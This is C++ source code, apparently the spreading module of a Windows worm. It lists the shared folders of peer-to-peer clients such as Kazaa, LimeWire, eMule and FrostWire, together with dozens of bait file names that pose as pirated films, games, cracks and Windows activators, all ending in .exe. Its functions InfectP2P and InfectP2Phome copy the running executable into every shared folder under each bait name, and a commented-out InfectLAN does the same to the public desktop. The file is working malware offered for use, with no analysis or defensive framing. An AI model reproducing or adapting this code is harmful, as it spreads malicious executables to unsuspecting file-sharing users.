#include "includes.h"
#include "externs.h"


char *szPath[] = 
{
	"kazaa\\my shared folder\\",
	"kazaa lite\\my shared folder\\",
	"kazaa lite k++\\my shared folder\\",
	"icq\\shared folder\\",
	"grokster\\my grokster\\",
	"bearshare\\shared\\",
	"edonkey2000\\incoming\\",
	"emule\\incoming\\",
	"morpheus\\my shared folder\\",
	"limewire\\shared\\",
	"tesla\\files\\",
	"winmx\\shared\\"
};

char *szPath2[] = 
{
	"Documents\\LimeWire\\Shared\\",
	"Documents\\FrostWire\\Shared\\"//All that I know for now.
};

char *szFiles[] =
{
"2012 (2009) R5 DVDRip XviD-MAX.exe",
"2012[2009]DvDrip[Eng]-FXG.exe",
"24.S08E12.HDTV.XviD-CRiMSON.avi.exe",
"30 Rock S04E15 HDTV XviD-LOL [eztv].exe",
"A.Serious.Man.2009.LIMITED.DVDRip.XviD-ESPiSE.avi.exe",
"Age of Empires 3.exe",
"Alice In Wonderland 2010 TS XViD - IMAGiNE[ExtraTorrent].exe",
"Alice.in.Wonderland-ViTALiTY.iso.exe",
"Order.of.Chaos.2010.DVDRip.XviD-SPRiNTER.exe",
"Percy Jackson and the Olympians (2010) R5 DVDRip XviD-MAX.exe",
"Percy Jackson and the Olympians (2010) Spanish DVDSCR.exe",
"Percy.Jackson.E.Gli.Dei.Dell.Olimpo.Il.Ladro.Di.Fulmini.2010.iTA.exe",
"Planet 51 (2009) R5 DVDRip XviD-MAX.exe",
"Plants vs Zombies [KTB] - v1.0.0.1051.exe",
"Prison Break The Conspiracy [PC] [www.SoloEstreno.com].exe",
"Prison Break The Conspiracy [RF] [X360] [www.SoloEstreno.com].exe",
"Prison.Break.The.Conspiracy.CLONEDVD-AVENGED-[tracker.BTARENA.or.exe",
"Pro.Evolution.Soccer.2010-RELOADED.exe",
"Prototype [PC] [MULTI2].exe",
"The Informant![2009]DvDrip[Eng]-FXG.exe",
"The Men Who Stare at Goats (2009) R5 DVDRip XviD-MAX.exe",
"The Men Who Stare at Goats (2009) Spanish BRSCR.exe",
"The Pacific (HBO 2010 - Part 1).exe",
"The Sims 3 - Razor1911 Final MAXSPEED.exe",
"The Sims 3 World Adventures Update 2.5.12-ViTALiTY.exe",
"The Sims 3 World Adventures-RELOADED.exe",
"The Spy Next Door (2010)  DVDRiP LiNE XViD READNFO - IMAGiNE.exe",
"The.Book.of.Eli.2010.TS.XviD-IMAGiNE.avi.exe",
"The.Crazies.2010.TS.XviD-Rx.exe",
"The.Office.S06E19.HDTV.XviD-LOL.[VTV].avi.exe",
"The.Princess.And.The.Frog.DVDRSCREENER.XviD-MENTiON.avi.exe",
"The.Sims.3.High.End.Loft.Stuff-ViTALiTY.exe",
"ACDC - Discography - 1975-2008 (31 CD's plus many extras &amp; co.exe",
"ADOBE ACROBAT 9.2.0 PRO EXTENDED EDITION + 9.3.1 UPDATE.exe",
"Adobe After Effects CS4 (Final) + Crack [RH].exe",
"Adobe CS3 Photoshop Extended and Illustrator - All Cracked.exe",
"Adobe CS4 Master Collection Mac - EN FR ESP.exe",
"Adobe CS4 Master Collection -MT-.exe",
"Adobe Dreamweaver CS4 + Keygen &amp; Activation Patch.exe",
"Adobe Flash CS4 Professional + Keygen.exe",
"Adobe Photoshop CS3 Extended Version Full + Crack.exe",
"The Beatles - discography (2009 Remastered).exe",
"U2 - Discography.exe",
"UK Top 40 Singles Chart 07-03-2010.exe",
"UK Top 40 Singles Chart 14-03-2010.exe",
"Usher-Raymond Vs Raymond-2010-P2P.exe",
"VMWare Workstation 6.5.3.185404 Incl Keygen(Tested, Works 100%).exe",
"Windows 7 All Editions - Activated x32x64 January 2010[ kk ].exe",
"Windows 7 all version 7600 16385 RTM Activator [by Sk].exe",
"Windows 7 Autoactivable [Spanish].exe",
"Windows 7 crack RemoveWAT 2.2.5.Hazar carter67.exe",
"Windows 7 Ultimate (Activated and TESTED!).exe",
"Windows 7 Ultimate AIO Activated.exe",
"Windows 7 Ultimate(32 &amp; 64 bit) Self Activation - Jz.exe",
"Windows XP Activation Crack.exe",
"Windows XP Home Edition with Service Pack 3 Retail (x86) (TPB).exe",
"WINDOWS_XP_PRO_32-BIT_SP3_ISO_ACTIVATED_GENUINE.exe",
"WinRAR 3.90 Beta 4 Cracked + Keygen + Instructions.txt + tnedor.exe",
"WinRAR v3.90 Final + KeyReg By ChattChitto.exe",
"WinRAR_3.80_Professional.exe",
"WinZip PRO v12.1 + Serials By ChattChitto.exe",
"Xilisoft avi to DVD converter v3.0.26 + keygen.exe",
"Yeah Yeah Yeahs - It's Blitz [mp3-192-2009].exe",
"Young Money - We Are Young Money (Retail)(GroupRip)(2009)-(Rap-M.exe",
"Young Money ft. Lloyd - BedRock [.mp3] - NEW SINGLE.exe",
"Young.Money-We.Are.Young.Money-(Retail)-2009-[NoFS].exe",
"Adobe Photoshop CS4 Extended.exe",
"NOD32 Anti-Virus 4.0.468.0-For Life.exe",
"Microsoft Office 2010 Professional Plus RC0 Build 4734-WinBeta.exe",
"CyberLink PowerDVD Ultra Deluxe Multilingual.exe",
"Adobe Photoshop Crack.exe",
"Magic ISO Maker 5.4-CRACKED.exe",
"LimeWire PRO v5.4.6.1.exe",
"LimeWireCrack.exe",
"WinRAR v3.90 Final Cracked.exe",
"Sony Vegas Pro 9.0c Build 896.exe",
"How-to-make-money.exe"
};

int InfectP2Phome()
{
	int f = 0;
	P2PInfo_s *pP2PInfo_s = new P2PInfo_s;
	if (pP2PInfo_s) 
		ZeroMemory(pP2PInfo_s, sizeof(P2PInfo_s));
	else
		ExitThread(0);
	GetModuleFileName(GetModuleHandle(NULL), pP2PInfo_s->szDirectory, sizeof(pP2PInfo_s->szDirectory));
	for (int i = 0; i < (sizeof(szPath2) / sizeof(LPTSTR)); i++)
	{
		for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
		{

            char p2pfolder[1024];
			char szBuf[256];
	        ExpandEnvironmentStrings("%USERPROFILE%",szBuf,256);
			sprintf( p2pfolder, "%s\\%s",szBuf,szPath2[i]);
			strcpy(pP2PInfo_s->szFilePath, p2pfolder);
			strcat(pP2PInfo_s->szFilePath, szFiles[j]);
			if (CopyFile(pP2PInfo_s->szDirectory, pP2PInfo_s->szFilePath, false) != 0) 
			{ 
				SetFileAttributes(pP2PInfo_s->szFilePath, FILE_ATTRIBUTE_NORMAL);
				f++;
			}
		}
	}
	delete pP2PInfo_s;
	return f;
}

/*int InfectLAN()
{
	int f = 0;
	P2PInfo_s *pP2PInfo_s = new P2PInfo_s;
	if (pP2PInfo_s) 
		ZeroMemory(pP2PInfo_s, sizeof(P2PInfo_s));
	else
		ExitThread(0);
	GetModuleFileName(GetModuleHandle(NULL), pP2PInfo_s->szDirectory, sizeof(pP2PInfo_s->szDirectory));
		for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
		{

            char p2pfolder[1024];
			char szBuf[256];
	        ExpandEnvironmentStrings("%PUBLIC%",szBuf,256);
			sprintf( p2pfolder, "%s\\Desktop\\",szBuf);
			strcpy(pP2PInfo_s->szFilePath, p2pfolder);
			strcat(pP2PInfo_s->szFilePath, szFiles[j]);
			if (CopyFile(pP2PInfo_s->szDirectory, pP2PInfo_s->szFilePath, false) != 0) 
			{ 
				SetFileAttributes(pP2PInfo_s->szFilePath, FILE_ATTRIBUTE_NORMAL);
				f++;
			}
	}
	delete pP2PInfo_s;
	return f;
}*/
int InfectP2P()
{
	int f = 0;
	P2PInfo_s *pP2PInfo_s = new P2PInfo_s;
	if (pP2PInfo_s) 
		ZeroMemory(pP2PInfo_s, sizeof(P2PInfo_s));
	else
		ExitThread(0);
	GetModuleFileName(GetModuleHandle(NULL), pP2PInfo_s->szDirectory, sizeof(pP2PInfo_s->szDirectory));
	for (int i = 0; i < (sizeof(szPath) / sizeof(LPTSTR)); i++)
	{
		for (int j = 0; j < (sizeof(szFiles) / sizeof(LPTSTR)); j++)
		{

            char p2pfolder[1024];
			char szBuf[256];
	        ExpandEnvironmentStrings("%programfiles%",szBuf,256);
			sprintf( p2pfolder, "%s\\%s",szBuf,szPath[i]);
			strcpy(pP2PInfo_s->szFilePath, p2pfolder);
			strcat(pP2PInfo_s->szFilePath, szFiles[j]);
			if (CopyFile(pP2PInfo_s->szDirectory, pP2PInfo_s->szFilePath, false) != 0) 
			{ 
				SetFileAttributes(pP2PInfo_s->szFilePath, FILE_ATTRIBUTE_NORMAL);
				f++;
			}
		}
	}
	delete pP2PInfo_s;
	return f;
}